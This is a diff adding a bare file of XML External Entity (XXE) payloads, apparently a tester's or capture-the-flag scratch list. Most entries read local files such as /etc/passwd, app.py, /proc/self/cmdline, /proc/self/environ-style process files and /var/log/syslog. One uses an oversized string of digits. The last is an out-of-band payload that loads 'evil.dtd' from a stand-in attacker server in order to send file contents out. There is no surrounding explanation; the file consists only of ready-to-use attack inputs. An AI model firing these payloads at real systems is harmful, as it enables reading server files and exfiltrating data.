@@ -1,0 +1,144 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<user>
+    <name>&xxe;</name>
+</user>
+
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:app.py">
+]>
+<user>
+    <name>&xxe;</name>
+</user>
+
+
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+">
+]>
+<user>
+    <name>&xxe;</name>
+</user>
+
+
+
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "/proc/self/cmdline">
+]>
+<user>
+    <name>&xxe;</name>
+</user>
+
+
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "/nonexistent/.bash_history">
+]>
+<user>
+    <name>&xxe;</name>
+</user>
+
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "/proc/1/maps">
+]>
+<user>
+    <name>&xxe;</name>
+</user>
+
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:///proc/self/maps">
+]>
+<user>
+  <name>&xxe;</name>
+</user>
+
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:///proc/self/comm">
+]>
+<user>
+  <name>&xxe;</name>
+</user>
+
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:/proc/self/status">
+]>
+<user>
+  <name>&xxe;</name>
+</user>
+
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:/proc/self/cmdline">
+]>
+<user>
+  <name>&xxe;</name>
+</user>
+
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:/proc/self/cwd">
+]>
+<user>
+  <name>&xxe;</name>
+</user>
+
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:/proc/self/exe">
+]>
+<user>
+  <name>&xxe;</name>
+</user>
+
+
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:/var/log/syslog">
+]>
+<user>
+  <name>&xxe;</name>
+</user>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "file:///proc/self/cmdline">
+  <!ENTITY % dtd SYSTEM "http://your-server.com/evil.dtd">
+  %dtd;
+]>
+<data>test</data>
